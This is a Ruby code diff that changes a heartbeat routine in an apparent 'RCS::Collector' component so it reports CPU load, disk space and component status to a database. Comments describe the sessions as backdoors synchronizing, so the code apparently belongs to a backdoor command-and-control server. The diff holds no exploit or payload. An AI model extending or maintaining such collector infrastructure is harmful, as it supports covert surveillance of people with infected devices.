@@ -4,6 +4,7 @@
 
 # relatives
 require_relative 'sessions.rb'
+require_relative 'status.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -20,22 +21,31 @@ class HeartBeat
     # if the database connection has gone
     # try to re-login to the database again
     DB.instance.connect! if not DB.instance.connected?
-    
+
+
+    # report our status to the db
+    component = "RCS::Collector"
+    # used only by NC
+    ip = ''
+
     # retrieve how many session we have
     # this number represents the number of backdoor that are synchronizing
     active_sessions = SessionManager.instance.length
 
-    # default message
-    message = "Idle..."
-
     # if we are serving backdoors, report it accordingly
-    message = "Serving #{active_sessions} sessions" if active_sessions > 0
+    message = (active_sessions > 0) ? "Serving #{active_sessions} sessions" : "Idle..."
 
-    # everything ok for us...
-    status = "OK"
+    # report our status
+    status = Status.my_status
+    disk = Status.disk_free
+    cpu = Status.cpu_load
+    pcpu = Status.my_cpu_load
 
-    # send my status to the db
-    DB.instance.update_status status, message
+    # create the stats hash
+    stats = {:disk => disk, :cpu => cpu, :pcpu => pcpu}
+
+    # send the status to the db
+    DB.instance.update_status component, ip, status, message, stats
 
   end
 end
